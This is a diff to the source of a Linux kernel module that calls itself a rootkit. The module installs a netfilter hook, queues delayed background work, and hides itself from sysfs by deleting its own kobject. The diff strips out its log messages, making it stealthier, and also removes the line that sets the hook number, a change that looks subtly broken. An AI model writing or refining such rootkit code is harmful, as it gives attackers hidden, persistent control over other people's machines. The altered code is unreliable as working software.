@@ -25,11 +25,9 @@ static struct nf_hook_ops nfho = {
 struct delayed_work g_delayed_init_work;
 struct workqueue_struct *g_delayed_init_wq;
 
-
 static int __init rootkit_init(void) {
 
 	/* Network Part */
-	nfho.hooknum = NF_INET_PRE_ROUTING; 
 	nfho.priv = init_search_map();
 	if (nfho.priv != NULL) {
 		fill_search_dict((search_map_t *)nfho.priv);
@@ -39,7 +37,6 @@ static int __init rootkit_init(void) {
 	// Create a dedicated workqueue
 	g_delayed_init_wq = create_singlethread_workqueue("delayed_module_init");
 	if (!g_delayed_init_wq) {
-		printk(KERN_ERR "Failed to create workqueue\\n");
 		return -ENOMEM;
 	}
 
@@ -56,8 +53,6 @@ static int __init rootkit_init(void) {
 
 	/* hide the module from /sys/modules */
 	kobject_del(&THIS_MODULE->mkobj.kobj);
-
-	printk(KERN_INFO "Module preliminary init complete, background initialization queued\n");
 
 	return 0;
 }
@@ -77,7 +72,6 @@ static void __exit rootkit_exit(void) {
 	}
 
 	fh_remove_hook(g_f_hook[0]);
-	printk(KERN_INFO "Rootkit has been unloaded\n");
 }
 
 
